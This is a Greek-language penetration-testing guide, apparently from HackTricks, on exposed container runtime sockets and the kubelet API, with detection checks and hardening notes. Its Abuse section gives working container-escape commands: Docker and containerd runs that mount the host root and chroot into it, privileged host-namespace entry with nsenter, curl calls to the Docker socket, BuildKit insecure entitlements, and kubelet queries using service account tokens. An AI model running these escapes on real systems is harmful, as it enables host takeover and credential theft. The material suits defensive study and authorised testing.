# Έκθεση Runtime API And Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλά πραγματικά container compromises δεν ξεκινούν καθόλου με namespace escape. Ξεκινούν με πρόσβαση στο runtime control plane. Αν ένα workload μπορεί να μιλήσει στο `dockerd`, `containerd`, CRI-O, Podman, ή kubelet μέσω ενός mounted Unix socket ή ενός exposed TCP listener, ο attacker μπορεί να είναι σε θέση να ζητήσει ένα νέο container με καλύτερα privileges, να κάνει mount το host filesystem, να ενωθεί με host namespaces, ή να ανακτήσει sensitive node information. Σε αυτές τις περιπτώσεις, το runtime API είναι το πραγματικό security boundary, και το compromising του είναι λειτουργικά κοντά στο compromising του host.

Γι’ αυτό η runtime socket exposure πρέπει να τεκμηριώνεται ξεχωριστά από τις kernel protections. Ένα container με συνηθισμένο seccomp, capabilities, και MAC confinement μπορεί ακόμα να απέχει μόνο ένα API call από το host compromise αν το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock` είναι mounted μέσα σε αυτό. Η kernel isolation του τρέχοντος container μπορεί να λειτουργεί ακριβώς όπως σχεδιάστηκε, ενώ το runtime management plane παραμένει πλήρως exposed.

## Μοντέλα Πρόσβασης Daemon

Το Docker Engine παραδοσιακά εκθέτει το privileged API του μέσω του τοπικού Unix socket στο `unix:///var/run/docker.sock`. Ιστορικά έχει επίσης εκτεθεί απομακρυσμένα μέσω TCP listeners όπως `tcp://0.0.0.0:2375` ή ενός TLS-protected listener στο `2376`. Η έκθεση του daemon απομακρυσμένα χωρίς ισχυρό TLS και client authentication ουσιαστικά μετατρέπει το Docker API σε remote root interface.

Το containerd, το CRI-O, το Podman, και το kubelet εκθέτουν παρόμοια surfaces υψηλής επίδρασης. Τα ονόματα και τα workflows διαφέρουν, αλλά η λογική όχι. Αν το interface επιτρέπει στον caller να δημιουργεί workloads, να κάνει mount host paths, να ανακτά credentials, ή να αλλάζει running containers, το interface είναι ένα privileged management channel και πρέπει να αντιμετωπίζεται ανάλογα.

Κοινά local paths που αξίζει να ελέγξετε είναι:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Παλαιότερα ή πιο εξειδικευμένα stacks μπορεί επίσης να εκθέτουν endpoints όπως `dockershim.sock`, `frakti.sock`, ή `rktlet.sock`. Αυτά είναι λιγότερο συνηθισμένα σε σύγχρονα environments, αλλά όταν τα συναντάτε πρέπει να αντιμετωπίζονται με την ίδια προσοχή επειδή αντιπροσωπεύουν surfaces ελέγχου του runtime και όχι συνηθισμένα application sockets.

## Secure Remote Access

Αν ένα daemon πρέπει να εκτεθεί πέρα από το local socket, η σύνδεση θα πρέπει να προστατεύεται με TLS και κατά προτίμηση με mutual authentication, ώστε το daemon να επαληθεύει τον client και ο client να επαληθεύει το daemon. Η παλιά συνήθεια του να ανοίγεται το Docker daemon σε plain HTTP για ευκολία είναι ένα από τα πιο επικίνδυνα λάθη στη διαχείριση containers, επειδή το API surface είναι αρκετά ισχυρό ώστε να δημιουργεί privileged containers απευθείας.

Το ιστορικό Docker configuration pattern έμοιαζε ως εξής:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Σε hosts βασισμένα στο systemd, η επικοινωνία του daemon μπορεί επίσης να εμφανίζεται ως `fd://`, που σημαίνει ότι η διεργασία κληρονομεί ένα προ-ανοιγμένο socket από το systemd αντί να το κάνει bind απευθείας η ίδια. Το σημαντικό μάθημα δεν είναι η ακριβής σύνταξη αλλά η συνέπεια ασφάλειας. Τη στιγμή που το daemon ακούει πέρα από ένα αυστηρά permissioned local socket, η transport security και η client authentication γίνονται υποχρεωτικές αντί για προαιρετικό hardening.

## Abuse

Αν υπάρχει runtime socket, επιβεβαίωσε ποιο είναι, αν υπάρχει compatible client, και αν είναι δυνατή η raw HTTP ή gRPC πρόσβαση:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες γιατί διακρίνουν ανάμεσα σε ένα νεκρό path, ένα mounted αλλά μη προσβάσιμο socket, και ένα live privileged API. Αν ο client πετύχει, το επόμενο ερώτημα είναι αν το API μπορεί να εκκινήσει ένα νέο container με host bind mount ή host namespace sharing.

### When No Client Is Installed

Η απουσία του `docker`, `podman`, ή κάποιου άλλου friendly CLI δεν σημαίνει ότι το socket είναι ασφαλές. Το Docker Engine μιλάει HTTP πάνω από το Unix socket του, και το Podman εκθέτει τόσο ένα Docker-compatible API όσο και ένα Libpod-native API μέσω του `podman system service`. Αυτό σημαίνει ότι ένα minimal environment με μόνο `curl` μπορεί ακόμα να είναι αρκετό για να ελέγξει το daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Αυτό έχει σημασία κατά τη διάρκεια του post-exploitation επειδή οι defenders μερικές φορές αφαιρούν τα συνηθισμένα client binaries αλλά αφήνουν το management socket mounted. Σε Podman hosts, θυμήσου ότι το high-value path διαφέρει μεταξύ rootful και rootless deployments: `unix:///run/podman/podman.sock` για rootful service instances και `unix://$XDG_RUNTIME_DIR/podman/podman.sock` για τα rootless.

### Full Example: Docker Socket To Host Root

Αν το `docker.sock` είναι reachable, το κλασικό escape είναι να ξεκινήσεις ένα νέο container που κάνει mount το host root filesystem και μετά να κάνεις `chroot` μέσα σε αυτό:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Αυτό παρέχει άμεση εκτέλεση host-root μέσω του Docker daemon. Το impact δεν περιορίζεται σε file reads. Μόλις βρεθεί μέσα στο νέο container, ο attacker μπορεί να αλλάξει host files, να συλλέξει credentials, να εγκαταστήσει persistence ή να ξεκινήσει επιπλέον privileged workloads.

### Full Example: Docker Socket To Host Namespaces

Αν ο attacker προτιμά namespace entry αντί για filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Αυτή η διαδρομή φτάνει στο host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση host-namespace αντί να εκμεταλλευτεί το τρέχον.

### Full Example: containerd Socket

Ένα mounted `containerd` socket είναι συνήθως εξίσου επικίνδυνο:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Αν υπάρχει ένας πιο Docker-like client, το `nerdctl` μπορεί να είναι πιο βολικό από το `ctr`, επειδή εκθέτει γνώριμα flags όπως `--privileged`, `--pid=host`, και `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Ο αντίκτυπος είναι ξανά παραβίαση host. Ακόμη κι αν το Docker-specific tooling απουσιάζει, ένα άλλο runtime API μπορεί πάλι να προσφέρει την ίδια διοικητική ισχύ. Σε Kubernetes nodes, το `crictl` μπορεί επίσης να είναι αρκετό για reconnaissance και container interaction, επειδή μιλά απευθείας με το CRI endpoint.

### BuildKit Socket

Το `buildkitd` είναι εύκολο να περάσει απαρατήρητο επειδή οι άνθρωποι συχνά το βλέπουν ως "μόνο το build backend", αλλά το daemon παραμένει ένα privileged control plane. Ένα προσβάσιμο `buildkitd.sock` μπορεί να επιτρέψει σε έναν attacker να εκτελέσει arbitrary build steps, να inspectάρει worker capabilities, να χρησιμοποιήσει local contexts από το compromised environment και να ζητήσει dangerous entitlements όπως `network.host` ή `security.insecure` όταν το daemon είχε ρυθμιστεί να τα επιτρέπει.

Χρήσιμες πρώτες αλληλεπιδράσεις είναι:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Εάν το daemon δέχεται αιτήματα build, δοκιμάστε αν είναι διαθέσιμα insecure entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Η ακριβής επίδραση εξαρτάται από τη ρύθμιση του daemon, αλλά μια rootful BuildKit service με permissive entitlements δεν είναι μια ακίνδυνη ευκολία για developers. Αντιμετώπισέ το ως άλλη μια administrative surface υψηλής αξίας, ειδικά σε CI runners και shared build nodes.

### Kubelet API Over TCP

Το kubelet δεν είναι container runtime, αλλά εξακολουθεί να αποτελεί μέρος του node management plane και συχνά βρίσκεται στην ίδια συζήτηση για το trust boundary. Αν το secure port του kubelet `10250` είναι προσβάσιμο από το workload, ή αν node credentials, kubeconfigs, ή proxy rights είναι εκτεθειμένα, ο attacker μπορεί να είναι σε θέση να enumerate Pods, να retrieve logs, ή να execute commands σε node-local containers χωρίς ποτέ να αγγίξει το Kubernetes API server admission path.

Ξεκίνα με cheap discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Εάν το kubelet ή το proxy path του API-server εξουσιοδοτεί `exec`, ένας WebSocket-capable client μπορεί να το μετατρέψει σε code execution σε άλλα containers στο node. Αυτός είναι επίσης ο λόγος που το `nodes/proxy` με μόνο `get` permission είναι πιο επικίνδυνο απ’ ό,τι ακούγεται: το request μπορεί ακόμα να φτάσει σε kubelet endpoints που εκτελούν commands, και αυτές οι άμεσες αλληλεπιδράσεις με το kubelet δεν εμφανίζονται στα κανονικά Kubernetes audit logs.

## Checks

Ο στόχος αυτών των checks είναι να απαντήσουν αν το container μπορεί να φτάσει οποιοδήποτε management plane που θα έπρεπε να έχει παραμείνει έξω από το trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Ένα mounted runtime socket είναι συνήθως ένα άμεσο administrative primitive και όχι απλή πληροφοριακή αποκάλυψη.
- Ένας TCP listener στο `2375` χωρίς TLS θα πρέπει να αντιμετωπίζεται ως remote-compromise condition.
- Environment variables όπως το `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload είχε σχεδιαστεί σκόπιμα για να μιλά με το host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | Το `dockerd` ακούει στο local socket και το daemon είναι συνήθως rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak ή missing TLS στο `2376` |
| Podman | Daemonless CLI by default | Δεν απαιτείται long-lived privileged daemon για συνηθισμένη local χρήση· τα API sockets μπορεί παρ' όλα αυτά να εκτεθούν όταν το `podman system service` είναι enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed μέσω του local socket και συνήθως consumed από higher-level tooling | mounting `containerd.sock`, broad `ctr` ή `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | Το CRI endpoint προορίζεται για node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint σε untrusted workloads |
| Kubernetes kubelet | Node-local management API | Το Kubelet δεν θα πρέπει να είναι broadly reachable από Pods· η πρόσβαση μπορεί να εκθέσει pod state, credentials, και execution features ανάλογα με το authn/authz | mounting kubelet sockets ή certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
